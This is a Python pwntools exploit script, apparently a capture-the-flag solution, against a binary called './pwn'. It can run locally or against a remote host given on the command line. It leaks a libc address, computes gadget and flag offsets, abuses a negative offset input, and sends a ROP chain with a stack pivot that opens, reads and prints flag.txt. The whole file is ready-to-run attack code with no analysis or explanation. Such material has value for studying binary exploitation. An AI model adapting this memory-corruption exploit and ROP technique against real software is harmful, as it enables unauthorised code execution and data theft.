#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwn', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process('./pwn')
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

p.send(p8(50))
p.recvuntil(b'>>')

addr_leak = u64(p.recvn(6).ljust(8, b'\x00'))
libc.address = addr_leak - 0x292e50
flag = addr_leak - 0xd90
pivot_gadget = addr_leak - 0x249936

log.info(f'Leaked address: {hex(addr_leak)}')
log.info(f'Libc base address: {hex(libc.address)}')
log.info(f'Pivot gadget: {hex(pivot_gadget)}')
log.info(f'Flag.txt address: {hex(addr_leak - 0xd90)}')

p.sendlineafter(b'>>', b'1')
p.sendlineafter(b'offset:', str(-0x3300).encode())

rop = ROP(libc)
rop.open(flag, 0, 0)
rop.read(3, flag, 0x100)
rop.write(1, flag, 0x100)

payload = flat(
    b'flag\x00\x00\x00\x00',
    rop.chain()
)

payload = payload.ljust(0x240 + 0x30, b'A')
payload += p64(flag + 0x8)  # pivot to rop chain
payload += p64(libc.address + 0x4b60b) # ret
payload = payload.ljust(0x288, b'A')
payload += p64(pivot_gadget)

p.sendafter(b'Content:', payload)
p.interactive()